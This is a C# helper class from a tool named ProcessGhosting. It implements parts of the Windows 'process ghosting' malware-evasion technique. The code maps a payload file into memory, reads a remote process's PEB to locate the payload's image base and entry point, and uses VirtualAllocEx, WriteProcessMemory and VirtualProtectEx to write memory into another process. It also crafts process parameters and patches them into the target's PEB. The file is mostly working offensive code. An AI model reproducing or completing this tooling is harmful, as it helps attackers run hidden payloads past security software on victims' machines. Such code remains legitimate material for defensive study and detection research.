using System;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Runtime.InteropServices;
using System.IO;
using HANDLE = System.IntPtr;

using static ProcessGhosting.UserDefinedTypes;

namespace ProcessGhosting
{
    class HelperFunctions
    {
        internal struct BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            //public IntPtr PebAddress;
            public PEB PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RTL_USER_PROCESS_PARAMETERS
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] Reserved1;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public IntPtr[] Reserved2;
            public UNICODE_STRING ImagePathName;
            public UNICODE_STRING CommandLine;
        }

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        [DllImport("kernel32.dll")]
        static extern void SetLastError(uint ErrorCode);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr CreateFileW([MarshalAs(UnmanagedType.LPWStr)] string filename, [MarshalAs(UnmanagedType.U4)] FileAccess access, [MarshalAs(UnmanagedType.U4)] FileShare share, IntPtr securityAttributes, [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition, [MarshalAs(UnmanagedType.U4)] FileAttributes flagsAndAttributes, IntPtr templateFile);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpFileMappingAttributes, FileMapProtection flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, [MarshalAs(UnmanagedType.LPStr)] string lpName);

        [DllImport("kernel32.dll")]
        static extern IntPtr MapViewOfFileEx(IntPtr hFileMappingObject, FileMapAccessType dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, UIntPtr dwNumberOfBytesToMap, IntPtr lpBaseAddress);

        [DllImport("kernel32.dll")]
        static extern bool GetFileSizeEx(IntPtr hFile, out long lpFileSize);

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("msvcrt.dll", EntryPoint = "memcpy", CallingConvention = CallingConvention.Cdecl, SetLastError = false)]
        public static extern IntPtr memcpy(IntPtr dest, IntPtr src, UIntPtr count);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
       
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint dwSize, ref uint lpNumberOfBytesRead);

        [DllImport("ntdll.dll")]
        public static extern void RtlInitUnicodeString(out UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

        [DllImport("userenv.dll", SetLastError = true)]
        static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);

        [DllImport("ntdll.dll")]
        public static extern UInt32 RtlCreateProcessParametersEx(ref IntPtr pProcessParameters, IntPtr ImagePathName, IntPtr DllPath, IntPtr CurrentDirectory, IntPtr CommandLine, IntPtr Environment, IntPtr WindowTitle, IntPtr DesktopInfo, IntPtr ShellInfo, IntPtr RuntimeData, uint Flags);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UInt32 dwSize, Int32 flAllocationType, Int32 flProtect);

        [DllImport("kernel32.dll")]
        public static extern Boolean WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesWritten);


        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int NtQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll")]
        public static extern void RtlZeroMemory(IntPtr pBuffer, int length);

        [DllImport("kernel32.dll")]
        public static extern Boolean VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UInt32 dwSize, MemoryProtection flNewProtect, ref UInt32 lpflOldProtect);

        public static IntPtr BufferPayload(string filename, ref long size)
        {
            IntPtr fileHandle = CreateFileW(filename, FileAccess.Read, FileShare.Read, IntPtr.Zero, FileMode.Open, FileAttributes.Normal, IntPtr.Zero);

            IntPtr mapping = CreateFileMapping(fileHandle, IntPtr.Zero, FileMapProtection.PageReadonly, (uint)0, (uint)0, String.Empty);

            IntPtr rawDataPointer = MapViewOfFileEx(mapping, FileMapAccessType.Read, 0, 0, UIntPtr.Zero, IntPtr.Zero);
            Console.WriteLine("Raw Data Pointer");
            Console.WriteLine(rawDataPointer);

            //long size;
            GetFileSizeEx(fileHandle, out size);
            Console.WriteLine("File Size : "+size);

            IntPtr localCopyAddress = VirtualAlloc(IntPtr.Zero, (uint)size, (uint)(AllocationType.Commit | AllocationType.Reserve), (uint)MemoryProtection.ReadWrite);
            //byte[] temp = BitConverter.GetBytes((UInt32)rawDataPointer);

            memcpy(localCopyAddress, rawDataPointer, (UIntPtr)size);
            //Marshal.Copy(temp, 0, localCopyAddress, (int)size);

            return localCopyAddress;
        }

        public static IntPtr GetEntryPoint(PROCESS_BASIC_INFORMATION bi, IntPtr hProcess)
        {
            
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr payloadBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            Console.WriteLine("Payload Base : 0x{0:X}", payloadBase.ToString("X"));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, payloadBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            Console.WriteLine("e_lfanew at : 0x{0:X}", e_lfanew_offset.ToString("X"));
            uint opthdr = e_lfanew_offset + 0x28;
            uint entryPoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            Console.WriteLine("entry Point rva at : 0x{0:X}", entryPoint_rva.ToString("X"));

            IntPtr addressOfEntryPoint = (IntPtr)(entryPoint_rva + (UInt64)payloadBase);
            Console.WriteLine("Address of Enptry Point : 0x{0:X}", addressOfEntryPoint.ToString("X"));

            return addressOfEntryPoint;
        }

        public static IntPtr CreateUnicodeStruct(string data)
        {
            UNICODE_STRING UnicodeObject = new UNICODE_STRING();
            string UnicodeObject_Buffer = data;
            UnicodeObject.Length = Convert.ToUInt16(UnicodeObject_Buffer.Length * 2);
            UnicodeObject.MaximumLength = Convert.ToUInt16(UnicodeObject.Length + 1);
            UnicodeObject.buffer = Marshal.StringToHGlobalUni(UnicodeObject_Buffer);
            IntPtr InMemoryStruct = Marshal.AllocHGlobal(16);
            Marshal.StructureToPtr(UnicodeObject, InMemoryStruct, true);

            return InMemoryStruct;

        }

        public static IntPtr ReadRemoteMem(IntPtr hProc, Int64 pMem, Int32 Size)
        {
            IntPtr pMemLoc = Marshal.AllocHGlobal(Size);
            RtlZeroMemory(pMemLoc, Size);

            uint BytesRead = 0;
            bool bRPM = ReadProcessMemory(hProc, (IntPtr)(pMem), pMemLoc, (uint)Size, ref BytesRead);
            //Console.WriteLine("Read Memory Error : 0x{0:X}", pMemLoc);
            if (bRPM != true)
            {
                if (BytesRead != Size)
                {
                    if (pMemLoc != IntPtr.Zero)
                    {
                        Marshal.FreeHGlobal(pMemLoc);
                    }
                    return IntPtr.Zero;
                }
                return IntPtr.Zero;
            }
            else
            {
                return pMemLoc;
            }

        }

        public static IntPtr AllocRemoteMem(IntPtr hProc, Int32 Size, IntPtr Address = new IntPtr())
        {
            IntPtr pRemoteMem = VirtualAllocEx(hProc, Address, (UInt32)Size, 0x3000, (Int32)MemoryProtection.ReadWrite);
            return pRemoteMem;
        }

        public static Boolean WriteRemoteMem(IntPtr hProc, IntPtr pSource, IntPtr pDest, Int32 Size, MemoryProtection Protect)
        {
            UInt32 BytesWritten = 0;
            Boolean bRemoteWrite = WriteProcessMemory(hProc, pDest, pSource, (uint)Size, ref BytesWritten);

            if (!bRemoteWrite)
            {
                return false;
            }

            UInt32 OldProtect = 0;
            Boolean bProtect = VirtualProtectEx(hProc, pDest, (uint)Size, Protect, ref OldProtect);
            if (!bProtect)
            {
                return false;
            }
            return true;
        }

        public static void GetDesktopInfo(PROCESS_BASIC_INFORMATION bi, IntPtr hProcess)
        {
            IntPtr thispeb = bi.PebAddress;
            IntPtr thisprocparam = ReadRemoteMem(hProcess, thispeb.ToInt64() + 0x20, 0x8);
            IntPtr deskInfoPtr = (IntPtr)(thisprocparam.ToInt64() + 0xc0);

            //Read Desktopinfo 

            Int64 test = Marshal.ReadInt64(deskInfoPtr + 0x636);
            Console.WriteLine("Desktopinfo value : 0x{0:X}" , test);
        }
 
        unsafe public static IntPtr SetupProcessParameters(IntPtr hProcess, PROCESS_BASIC_INFORMATION bi, string targetPath)
        {
            IntPtr temp = bi.PebAddress;
            Console.WriteLine("[+] PEB Base                      : 0x" + string.Format("{0:X}", temp.ToInt64()));
    
            Int32 CommandLine = 0x70;
            Int32 ReadSize = 0x8;
            SetLastError(0);
            UInt64 ProcParams;

            //RTL_USER_PROCESS_PARAMETERS unicode string params

            String WinDir = Environment.GetEnvironmentVariable("windir");
            IntPtr uSystemDir = CreateUnicodeStruct(WinDir + "\\System32");
            IntPtr uTargetPath = CreateUnicodeStruct(targetPath);
            IntPtr uWindowName = CreateUnicodeStruct("test");
            IntPtr uCurrentDir = CreateUnicodeStruct("C:\\Users\\User\\Desktop");
            IntPtr desktopInfo = CreateUnicodeStruct(@"WinSta0\Default");

            IntPtr environment = IntPtr.Zero;
            CreateEnvironmentBlock(out environment, IntPtr.Zero, true);
            //PEB = TEB + 0x1000
            IntPtr pProcParams = IntPtr.Zero;
            GetDesktopInfo(bi, hProcess);
            UInt32 status = RtlCreateProcessParametersEx(ref pProcParams, uTargetPath, uSystemDir, uSystemDir, uTargetPath, environment, uWindowName, desktopInfo, IntPtr.Zero, IntPtr.Zero, 1);

            //Writing params into process
            Int32 EnvSize = Marshal.ReadInt32((IntPtr)pProcParams.ToInt64() + 0x3f0);
            IntPtr EnvPtr = (IntPtr)Marshal.ReadInt64((IntPtr)(pProcParams.ToInt64() + 0x080));

            bool writememstat = false;
            Int32 Length = Marshal.ReadInt32((IntPtr)pProcParams.ToInt64() + 4);

            IntPtr buffer = pProcParams;
            Int64 buffer_end = pProcParams.ToInt64() + Length;
            if (pProcParams.ToInt64() > EnvPtr.ToInt64())
            {
                buffer = EnvPtr;
            }
            IntPtr env_end = (IntPtr)(EnvPtr.ToInt64() + EnvSize);
            if (env_end.ToInt64() > buffer_end)
            {
                buffer_end = env_end.ToInt64();
            }

            uint buffer_size = (uint)(buffer_end - buffer.ToInt64());
            //VirtualAllocEx(hProcess, pProcParams, (uint)Length, (int)(AllocationType.Commit | AllocationType.Reserve), (int)MemoryProtection.ReadWrite);
            VirtualAllocEx(hProcess, buffer, buffer_size, (int)(AllocationType.Commit | AllocationType.Reserve), (int)(MemoryProtection.ReadWrite));
            SetLastError(0);
            writememstat = WriteRemoteMem(hProcess, pProcParams, pProcParams, Length, MemoryProtection.ReadWrite);
            Console.WriteLine("pProcparam : 0x{0:X}", pProcParams.ToInt64());
            Console.WriteLine("Env Size : 0x{0:X}", EnvSize);
            Console.WriteLine("Env Pointer: 0x{0:X}", EnvPtr.ToInt64());
            writememstat = WriteRemoteMem(hProcess, EnvPtr, EnvPtr, EnvSize, MemoryProtection.ReadWrite);
            SetLastError(0);
            //Writing params in blocks

            VirtualAllocEx(hProcess, pProcParams, (uint)Length, (int)(AllocationType.Commit | AllocationType.Reserve), (int)MemoryProtection.ReadWrite);
            Console.WriteLine("Check Error : " + GetLastError());
            writememstat = WriteRemoteMem(hProcess, pProcParams, pProcParams, Length, MemoryProtection.ReadWrite);
            
            VirtualAllocEx(hProcess, EnvPtr, (uint)EnvSize, (int)(AllocationType.Commit | AllocationType.Reserve), (int)MemoryProtection.ReadWrite);
            Console.WriteLine("Check error 2 : " + GetLastError());
            writememstat = WriteRemoteMem(hProcess, EnvPtr, EnvPtr, EnvSize, MemoryProtection.ReadWrite);

            //Set params in peb
            IntPtr myProcParams = Marshal.AllocHGlobal(ReadSize);
            Marshal.WriteInt64(myProcParams, (Int64)pProcParams);

            writememstat = WriteRemoteMem(hProcess, myProcParams, (IntPtr)(temp.ToInt64() + 0x20), ReadSize, MemoryProtection.ReadWrite);

            return hProcess;
        }
    }
}
